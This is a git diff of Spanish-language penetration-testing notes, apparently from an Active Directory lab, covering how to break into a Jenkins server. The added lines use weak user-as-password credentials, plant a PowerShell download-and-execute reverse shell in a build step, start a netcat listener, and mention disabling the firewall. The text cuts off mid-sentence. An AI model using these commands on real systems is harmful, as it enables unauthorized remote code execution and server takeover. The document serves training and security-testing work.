@@ -187,4 +187,18 @@ Find-PSRemotingLocalAdminAccess -Verbose
 Descubriendo permisos de administrador local en otras maquinas
 
 ## Explotación de Jenkins 172.16.3.11:8080
-Accederemos a la web y hay un campo el cual nos muestra diferentes nombres de usuario pertenecientes a la web, antes de hacer un ataque de fuerza bruta probaremos haciendo un User as Password por si hay alguna coincicdencia, en este caso *builduser::builduser*
+Accederemos a la web y hay un campo el cual nos muestra diferentes nombres de usuario pertenecientes a la web, antes de hacer un ataque de fuerza bruta probaremos haciendo un User as Password por si hay alguna coincidencia, en este caso *builduser::builduser*
+
+Una vez estamos dentro podemos modificar un proyecto y enviarnos una reverse shell.
+Entraremos en un proyecto, y en la parte de configuración -> Build steps podemos meter nuestra reverse shell
+```shell
+powershell.exe iex (iwr http://172.16.100.97/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.97 -Port 1339
+```
+
+La guardaremos y nos pondremos en escucha por el puerto indicado en esta
+```shell
+C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 1339
+```
+
+Además al tener Privilegios de Administrador Local podremos deshabilitar las reglas de firewall
+Despues de tenerlo deshabilitado podemos ejecu
